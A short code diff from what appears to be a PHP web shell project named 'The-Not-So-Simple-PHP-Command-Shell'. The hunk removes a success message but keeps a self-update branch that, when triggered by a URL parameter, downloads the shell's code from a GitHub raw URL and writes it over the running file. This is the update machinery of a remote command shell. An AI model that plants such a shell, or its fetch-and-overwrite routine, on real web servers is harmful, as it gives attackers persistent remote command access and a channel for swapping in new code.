@@ -114,8 +114,6 @@
 
         if (isset($_GET['update']) && $_GET['update'] == "true"){
             file_put_contents('nsscmdshell.php', file_get_contents('https://raw.githubusercontent.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/main/nsscmdshell.php'));
-            die('<div style="background:green;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Success!</h4><p>nsscmdshell.php was successfully updated. </p></div>');
-
             }
         ?>
     </body>
